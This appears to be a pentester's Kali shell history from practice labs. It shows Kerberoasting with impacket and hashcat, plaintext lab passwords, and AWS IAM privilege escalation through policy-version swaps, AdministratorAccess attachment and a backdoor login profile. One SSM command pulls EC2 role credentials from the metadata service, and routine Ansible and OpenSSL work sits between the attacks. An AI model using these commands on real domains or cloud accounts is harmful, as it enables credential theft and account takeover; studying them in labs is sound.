+ 1313  GetNPUsers.py -dc-ip  192.168.1.12 oscp/admin -no-pass
+ 1314  GetNPUsers.py -domain oscp.local
+ 1315  GetUserSPNs.py
+ 1316  GetUserSPNs.py oscp.local/admin:Wipro@0418
+ 1317  GetUserSPNs.py -request oscp.local/admin:Wipro@0418
+ 1318  GetUserSPNs.py -request oscp.local/admin:Wipro@0418 -outputfile hashe_oscp.local
+ 1320  cat hashe_oscp.local
+ 1321  hashcat --help
+ 1322  hashcat -a  hashe_oscp.local
+ 1323  hashcat -m 13100 hashe_oscp.local users
+ 1324  hashcat -m 13100 hashe_oscp.local user
+ 1328  cp ~/impacket/examples/hashe_oscp.local ~
+ 1330  locate users
+ 1331  locate userlist
+ 1332  locate Password
+ 1334  cat crack.password.db
+ 1337  hashcat -m 13100 hashe_oscp.local password.txt
+ 1338  cd impacket/examples
+ 1340  GetUserSPNs.py 
+ 1342  sudo GetUserSPNs.py oscp/admin:Wipro@0148
+ 1343  GetUserSPNs.py oscp/admin:Wipro@0148 -outputfile hashe2
+ 1344  GetUserSPNs.py oscp/admin:Wipro@0148
+ 1345  GetUserSPNs.py oscp.local/admin:Wipro@0148
+ 1346  ping oscp.local
+ 1347  GetUserSPNs.py oscp.local/admin
+ 1348  GetUserSPNs.py -request oscp.local/admin
+ 1349  GetUserSPNs.py -request oscp.local/admin -outputfile hashe2
+ 1351  cat hashe2
+ 1352  cp hashe2 ~
+ 1353  cd `
+ 1354  cd ~
+ 1356  vi password,txt
+ 1357  vi password.txt
+ 1358  hashcat -m 13100 hashe2 password.txt
+ 1359  sudo hashcat -m 13100 hashe2 password.txt
+ 1360  nmap -A -v -sV 192.168.1.12
+ 1363  cd /usr/share/ansible/plugins/modules
+ 1364  cd /usr/share/ansible/plugins
+ 1365  cd /usr/share/ansible/plugins/
+ 1370  locate --help
+ 1371  locate -A ansible
+ 1373  ansible
+ 1374  ansible all -i
+ 1380  wget ansible.cfg
+ 1382  ansible-config init
+ 1383  ansible-config init --disabled > ansible.cfg
+ 1385  ansible-config list
+ 1386  ansible-config list h
+ 1387  ansible-config dump
+ 1390  ansible-config view
+ 1391  ansible-config -h
+ 1394  wget https://raw.githubusercontent.com/ansible/ansible/stable-2.9/examples/ansible.cfg
+ 1396  rm ansible.cfg
+ 1398  cp ansible.cfg.1 ansible.cfg
+ 1399  rm ansible.cfg.1
+ 1401  cat ansible.cfg
+ 1403  SSH_CONNECTION=3.3.3.3
+ 1407  ssh -l cisco -B eth0 3.3.3.3
+ 1408  ssh -l cisco -b 192.168.30.103 3.3.3.3
+ 1409  ssh cisco@3.3.3.3:22
+ 1410  ssh cisco@3.3.3.3
+ 1414  ansible-playbook --help
+ 1415  ansible-playbook -h
+ 1416  sudo ansible-playbook
+ 1420  sudo ansible-playbook show\ ver.yml
+ 1421  sudo ansible-playbook show\ ver.yml -o test.txt
+ 1422  sudo ansible-playbook show\ run
+ 1429  ssh 192.168.30.60
+ 1431  ansible-playbook --version
+ 1437  vi /etc/ssh/sshd_config
+ 1443  sudo service ssh restart
+ 1444  ssh cisco@192.168.30.60
+ 1453  cd .
+ 1456  cd home
+ 1458  cd kali
+ 1475  locate ansible-core
+ 1477  ssh cusco@3.3.3.3
+ 1486  ssh -l cisco 10.0.10.1
+ 1490  ping 192.168.1.20
+ 1494  mkdir ansible
+ 1498  ping 192.168.1.2
+ 1499  ping 192.168.1.1
+ 1501  ssh 3.3.3.3
+ 1503  telnet 3.3.3.3
+ 1505  ssh -l
+ 1507  ping 3.3.3.3
+ 1510  ping 192.168.30.60
+ 1511  ping 2.2.2.2
+ 1513  ssh -l cisco 3.3.3.3 ?
+ 1515  vi /etc/ssh/ssh_config
+ 1517  service restart sssh
+ 1518  sudo service restart sssh
+ 1519  sudo service stop sssh
+ 1525  sudo vi /etc/ssh/ssh_config
+ 1526  service ssh restart
+ 1527  ssh -l cisco 3.3.3.3
+ 1532  vi hosts
+ 1533  ansible-playbook 4\ -\ sh\ version\ -\ user\ mode\ Part\ 2.yml -u cisco
+ 1536  ansible-playbook 5\ -\ sh\ run\ -\ exec\ mode\ Part\ 3.yml -u cisco -k
+ 1537  vi ansible.cfg
+ 1540  ansible-playbook 4\ -\ sh\ version\ -\ user\ mode\ Part\ 2.yml -u cisco -k
+ 1543  sudo ansible-playbook 4\ -\ sh\ version\ -\ user\ mode\ Part\ 2.yml -u cisco -k
+ 1544  ansible-playbook show\ ver.yml -u cisco -k
+ 1554  cat 3.3.3.3.txt
+ 1555  rm 3.3.3.3.txt
+ 1557  sudo rm 3.3.3.3.txt
+ 1558  sudo ansible-playbook show\ ver.yml -u cisco -k
+ 1560  sudo ansible-playbook --version
+ 1563  sudo ansible-playbook asa.yml
+ 1569  ipconfig
+ 1571  openssl genrsa 2048 > host.key
+ 1573  cat host.key
+ 1575  cat
+ 1576  cat domain.csr
+ 1577  ping 192.168.20.1
+ 1579  apt-get install ansible
+ 1580  sudo apt-get install ansible
+ 1581  cd /etc/ansible
+ 1582  cd /etc/ansible/
+ 1584  cd /
+ 1585  cd etc
+ 1588  locate ansible
+ 1589  ansible --version
+ 1590  cd /usr/bin/ansible
+ 1592  cd /home/kali/.ansible/plugins/modules
+ 1594  wget openssl
+ 1595  openssl
+ 1597  openssl x509 -inform PEM -in certnew.cer cert.crt
+ 1598  openssl x509 -inform PEM -in certnew.cer -o cert.crt
+ 1599  openssl x509 -inform PEM -in certnew.cer -out cert.crt
+ 1600  openssl req -newkey rsa:2048 -keyout PRIVATEKEY.key -out MYCSR.cs
+ 1601  openssl req -newkey rsa:2048 -keyout PRIVATEKEY.key -out MYCSR.csr
+ 1602  openssl genrsa 2048 > host2.key
+ 1604  cat host2.key
+ 1605  cat host2.csr
+ 1606  openssl pkcs12 -export -out host2.pfx -inkey host2.key -in host2.cer
+ 1610  cat show\ run.yml
+ 1611  ansible-playbook show\ run.yml
+ 1613  ssh cisco@10.0.10.1
+ 1614  sudo ansible-playbook show\ run.yml
+ 1616  sudo  ansible --version
+ 1617  ansible-core --version
+ 1618  ansible-config --version
+ 1619  sudo ansible-config --version
+ 1621  ansible-galaxy --version
+ 1623  ansible-galaxy collection -h
+ 1628  cd ansible
+ 1631  ssh -l asa 192.168.30.60
+ 1632  sudo ansible-playbook asa2.yml
+ 1633  sudo ansible-playbook asa2.yml -u asa
+ 1634  sudo ansible-playbook asa2.yml -u asa -k
+ 1635  sudo ansible-playbook asa2.yml -u asa -K
+ 1636  sudo ansible-playbook asa2.yml -u asa -k -K
+ 1637  cat hosts
+ 1638  ping 10.0.10.1
+ 1640  sudo ansible-playbook ios_config_test.yml -n
+ 1642  ansible-galaxy collection list
+ 1643  sudo ansible-galaxy collection list
+ 1645  locate cisco.ios
+ 1646  sudo ansible-playbook ios_config_test.yml
+ 1647  openssl x509 -in cacert.cer -inform DER -out cacert.pem -outform PEM
+ 1649  openssl pkcs12 -export -out cacert.p12 -inkey app.key -in cacert.pem
+ 1651  netstat
+ 1652  ip link
+ 1655  cd Documents/t
+ 1656  cd /root
+ 1659  ping 8.8.8.8
+ 1660  sudo apt install strongswan
+ 1661  cat /etc/ipsec.conf
+ 1662  cat /etc/ipsec.secrets
+ 1664  sudo vi /etc/ipsec.secrets
+ 1665  sudo cat /etc/ipsec.secrets
+ 1666  locate charon.log
+ 1667  locate strongswan.conf 
+ 1668  cat /etc/strongswan.conf
+ 1670  mkdir ipsec
+ 1671  cd ipsec
+ 1678  sudo ipsec restart
+ 1683  sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+ 1685  tcpdump -s 0 -n -i nflog:5
+ 1686  sudo tcpdump -s 0 -n -i nflog:5
+ 1687  iptables -t filter -I OUTPUT -m policy --pol ipsec --dir out -j NFLOG --nflog-group 5
+ 1688  iptables -t filter -I FORWARD -m addrtype ! --dst-type LOCAL -m policy --pol ipsec --dir in -j NFLOG --nflog-group 5
+ 1689  swanctl -l
+ 1690  iptables -t raw -I OUTPUT -p udp -m multiport --dports 500,4500 -j NFLOG --nflog-group 5
+ 1691  ip xfrm state
+ 1694  set vpn ipsec logging log-modes 'private'
+ 1695  sudo ip xfrm state
+ 1696  sudo  ip xfrm policy 
+ 1697  delete vpn ipsec logging log-modes 'private'
+ 1698  apt-get install youtubedl
+ 1699  sudo apt-get install youtubedl
+ 1701  sudo apt-get update youtube-dl
+ 1702  sudo apt-get update youtube-dl --fix-missing
+ 1703  sudo apt-get install youtube-dl
+ 1704  curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+ 1705  unzip awscliv2.zip
+ 1706  sudo ./aws/install
+ 1707  aws --version
+ 1710  aws iam list-groups-for-user --user-name ad-adminson
+ 1711  aws iam list-attached-user-policies --user-name ad-user
+ 1713  curl https://raw.githubusercontent.com/jeswinMathai/wordlist/main/names.txt -o names.txt
+ 1715  sed -i 's/^/ad-/g' names.txt
+ 1716  cat names.txt
+ 1717  run iam__enum_roles --role-name a4 --account-id 276384657722 --word-list
+ 1719  run iam__enum_roles --role-name a4 --account-id 276384657722 --word-list /home/kali/aws/names.txt
+ 1722  vi assume-role-doc.json
+ 1723  cat assume-role-doc.json
+ 1724  aws iam create-role --role-name a4 --assume-role-policy-document
+ 1725  aws iam create-role --role-name a4 --assume-role-policy-document file://assume-role-doc.json
+ 1726  git clone https://github.com/RhinoSecurityLabs/pacu
+ 1728  bash install.sh
+ 1729  python3 pacu.py
+ 1731  cd pacu
+ 1733  cd ..
+ 1735  python3 cli.py
+ 1736  aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole test
+ 1742  ./configure
+ 1743  /.aws/credentials
+ 1746  aws config
+ 1747  /.aws/config
+ 1748  ~/.aws/credentials
+ 1749  sudo ~/.aws/credentials
+ 1750  sudo ~/.aws/config
+ 1751  ~ .aws/config
+ 1752  sudo ~ .aws/config
+ 1753  ./home/kali/aws/config
+ 1754  ~/.aws/config
+ 1755  sudo -i
+ 1758  aws iam get-role --profile test
+ 1759  aws iam get-role --role-name Ad-LoggingRole --profile test
+ 1762  pwd
+ 1763  cat /home/kali/.aws/
+ 1764  cat /home/kali/.aws/credentials
+ 1765  aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name test
+ 1767  aws sts get-caller-identity
+ 1768  aws sts get-caller-identity --profile test
+ 1769  aws iam list-attached-role-policies --role-name ad-LoggingRole --profile test
+ 1770  aws iam list-role-policies --role-name ad-LoggingRole --profile test
+ 1771  aws s3 list --profile test
+ 1772  aws s3 ls --profile test
+ 1776  aws iam get-policy --policy-arn arn:aws:iam::607486832336:policy/Service
+ 1777  aws iam get-policy --policy-arn arn:aws:iam::935468040618:policy/Service
+ 1778  aws iam get-policy-version --policy-arn arn:aws:iam::935468040618:policy/Service --version-id v1
+ 1780  aws iam list-policies | grep ‘AdministratorAccess’
+ 1781  aws iam list-policies 
+ 1782  aws iam list-policies | grep ‘Administrator'\n
+ 1783  aws iam list-policies | grep ‘Administrator'
+ 1786  aws iam list-attached-policies --user-name student
+ 1794  aws iam get-user-policy --user-name student --policy-name terraform-20220615085148909500000003
+ 1799  aws iam get-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --version-id 1
+ 1800  aws iam list-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print
+ 1801  aws iam list-policy-versions --policy-arn arn:aws:iam::073313463356:policy/Print
+ 1802  aws iam get-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --version-id v1
+ 1804  cat Adminpolicy.json
+ 1805  aws iam create-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --Policy-document file://Adminpolicy.json --set-as-default
+ 1806  aws iam create-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --policy-document file://Adminpolicy.json --set-as-default
+ 1807  aws iam create-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --policy-document file://Adminpolicy.json --set-as-default --profile updater
+ 1808  aws iam get-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --version-id v2
+ 1809  ┌──(kali㉿kali)-[~/aws]
+ 1810  └─$ aws iam get-policy-version --policy-arn arn:aws:iam::073313463356:policy/Print --version-id v2
+ 1811  {\n    "PolicyVersion": {\n        "Document": {\n            "Version": "2012-10-17",\n            "Statement": [\n                {\n                    "Effect": "Allow",\n                    "Action": "*",\n                    "Resource": "*"\n                }\n            ]\n        },\n        "VersionId": "v2",\n        "IsDefaultVersion": true,\n        "CreateDate": "2022-06-15T09:20:56+00:00"\n    }
+ 1812  aws sts assume-role --role-arn arn:aws:iam::073313463356:role/Adder --roles-session-name adder
+ 1813  aws sts assume-role --role-arn arn:aws:iam::073313463356:role/Adder --role-session-name adder
+ 1816  aws sts assume-role --role-arn arn:aws:iam::073313463356:role/PolicyUpdater --role-session-name updater
+ 1818  aws s3 ls
+ 1819  aws iam get-policy --policy-arn arn:aws:iam::159412314522:policy/Service
+ 1820  aws iam get-policy-version --policy-arn arn:aws:iam::159412314522:policy/Service --version-id v1
+ 1821  aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+ 1822  aws iam create-user -user-name Bob
+ 1823  aws iam get-user-policies --user-name student --policy-name terraform-20220614091528532900000002
+ 1824  aws iam get-user-policy --user-name student --policy-name terraform-20220614091528532900000002
+ 1825  aws iam list-role-policies --role-name Attacher
+ 1826  aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy
+ 1828  aws iam list-attached-user-group-policies --user-name student
+ 1829  aws iam list-attached-group-policies --user-name student
+ 1830  aws iam list-attached-group-policies --user-name student --group-name Printer
+ 1831  aws iam list-attached-group-policies --group-name Printer
+ 1836  aws iam get-user-policy --user-name student --policy-name terraform-20220614102223634500000003
+ 1837  aws iam list-role-policies --role-name Adder
+ 1838  aws iam get-role-policy --role-name Adder --policy-name AddUser
+ 1839  aws iam list-role-policies --role-name PolicyUpdater
+ 1840  aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion
+ 1841  aws iam list-group-policies --group-name Printers
+ 1842  aws iam list-attached-group-policies --group-name Printers
+ 1843  aws iam get-attached-group-policies --group-name Printers
+ 1844  aws iam get-attached-group-policy --group-name Printers
+ 1845  aws iam get-attached-group-policy --policy-name Print
+ 1847  aws iam get-group-policy --group-name Printers --policy-name Print
+ 1848  aws iam get-group-policy --group-name Printers --policy-name Adminpolicy
+ 1852  aws iam get-user-policy --user-name student --policy-name terraform-20220615094051473000000002
+ 1853  aws iam create-user --user-name Bob
+ 1854  aws iam list-policies | grep 'AdministratorAccess'
+ 1855  aws iam list-policies | grep 'Administrator'
+ 1856  aws iam list-attached-user-policies | grep 'AdministratorAccess'
+ 1857  aws iam list-attached-user-policies --user-name * | grep 'AdministratorAccess'
+ 1858  aws iam list-users
+ 1859  aws iam list-attached-user-policies --user-name AdminBob
+ 1860  aws iam create-login-profile --user-name AdminBob --password abcd@12345 --no-password-reset-required
+ 1861  aws sts assume-role --role-arn arn:aws:iam::768572954525:role/Attacher --role-session-name attacher_test
+ 1862  vi /home/kali/.etc/credentials
+ 1864  aws iam list-attached-group-policies --group-name Printers    
+ 1865  aws iam get-attached-group-policy --group-name Printers --policy-name Print
+ 1866  aws sts assume-role --role-arn arn:aws:iam::768572954525:role/Adder --role-session-name adder_test
+ 1868  aws iam add-user-to-group --group-name Printers --user-name student --profile adder
+ 1869  aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+ 1870  aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile attacher
+ 1871  vi /home/kali/.aws/credentials
+ 1873  vi Adminpolicy.json
+ 1874  aws iam create-policy-version --policy-arn arn:aws:iam::651929828758:policy/Print
+ 1875  aws iam create-policy-version --policy-arn arn:aws:iam::651929828758:policy/Print --policy-document file://Adminpolicy.json --set-as-default --profile Policy
+ 1876  aws iam create-policy-version --policy-arn arn:aws:iam::651929828758:policy/Print --policy-document file://Adminpolicy.json --set-as-default --profile policy
+ 1877  aws iam get-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print --version-id v2
+ 1878  aws iam get-policy-version --policy-arn arn:aws:iam::651929828758:policy/Print
+ 1879  aws iam get-policy-version --policy-arn arn:aws:iam::651929828758:policy/Print --version-id v2
+ 1880  aws iam get-policy --policy-arn arn:aws:iam::645723898191:policy/Print
+ 1881  aws iam get-policy --policy-arn arn:aws:iam::651929828758:policy/Print
+ 1882  aws iam get-policy-version --policy-arn arn:aws:iam:651929828758:policy/Print --version-id v1
+ 1883  aws iam get-policy-version --policy-arn arn:aws:iam:651929828758:policy/Print --version-id v2
+ 1888  cd aws
+ 1889  cd ~/python
+ 1893  ;s
+ 1902  index.php
+ 1905  aws configure
+ 1906  aws iam list-attached-user-policies --user-name student
+ 1907  aws iam list-user-policies --user-name student
+ 1908  aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role
+ 1909  aws iam list-roles 
+ 1910  aws iam list-roles | grep 'Service": "ec2.
+ 1911  aws iam list-roles | grep 'Service: ec2
+ 1912  aws iam list-roles | grep 'Service: ec2'
+ 1913  aws iam list-roles | grep '"Service: "ec2.'
+ 1914  aws iam list-roles | grep 'ec2.
+ 1915  aws iam list-roles | grep 'ec2.'
+ 1916  aws iam get-role-policy --role-name ec2admin
+ 1917  aws iam list-role-policies --role-name ec2admin
+ 1918  aws iam get-role-policy --role-name ec2admin --policy-name terraform-20220615101303084300000003
+ 1919  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json 
+ 1920  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json --count 1
+ 1921  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | grep 'ami-
+ 1922  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | grep 'ami-'
+ 1923  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=es | sort by(.CreationDate) | last(.[]).ImageId'
+ 1924  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=es | sort by(.CreationDate)| last(.[]).ImageId'
+ 1925  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' | sort by(.CreationDate)| last(.[]).ImageId'
+ 1926  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available'  --query 'reverse(sort_by(Images,&CreationDate))[:5].{id:ImageId,date:CreationDate}'
+ 1927  aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' --query 'reverse(sort_by(Images,&CreationDate))[:5].{id:ImageId,date:CreationDate}'
+ 1928  aws ec2 describe-subnets
+ 1929  aws ec2 describe-security-groups
+ 1930  aws iam list-instance-profiles
+ 1931  aws ec2 run-instances --subnet-id subnet-0964acc46e7cb1c19 --image-id ami-0e92ff042f4c4c6a8 --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-081669ca976888d9d"
+ 1933  aws ssm get-command-invocation \\n--command-id "da6a4466-ad0a-4ca2-a880-1419a5554be5" \\n--instance-id "i-024d4899dd7793839"
+ 1934  aws ssm send-command \\n--document-name "AWS-RunShellScript" \\n--parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \\n--targets "Key=instanceids,Values=i-024d4899dd7793839" \\n--comment "aws cli 1"
+ 1935  cd p
+ 1946  └─$ ls ..
+ 1948  ┌──(kali㉿kali)-[~/python]
+ 1949  └─$ ls -la
+ 1950  total 12
+ 1951  drwxr-xr-x  2 kali kali 4096 Jun 26 12:03 .
+ 1952  drwxr-xr-x 34 kali kali 4096 Jun 26 12:40 ..
+ 1953  -rw-r--r--  1 kali kali   56 Jun 24 18:15 except.py
+ 1954  └─$ ls
+ 1955  '~'               cacert.cer          get-pip.py         js.exe           password.txt     root.txt       unshadowed.db
+ 1956  ┌──(kali㉿kali)-[~]
+ 1957  └─$ 
+ 1961  mkdir python
+ 1965  nano except.py
+ 1966  python3 except.py
+ 1969  ip a
+ 1972  cat except.py
+ 1973  vi except.py
+ 1977  show dns
+ 1979  nslookup google.com
+ 1981  ping google.com
+ 1982  ifconfig
+ 1987  cat index.php
+ 1988  vi index.php
+ 1994  ls -l
+ 1996  ls ..
+ 1997  ls .
+ 1998  tree .
+ 1999  tree ..
+ 2002  ls -la
+ 2003  emnv
+ 2004  env
+ 2005  mc
+ 2006  which cd
+ 2007  which pwd
+ 2008  which python3
+ 2009  ls *py
+ 2010  ls py*
+ 2011  ls Py*
+ 2012  cd python
+ 2013  ls
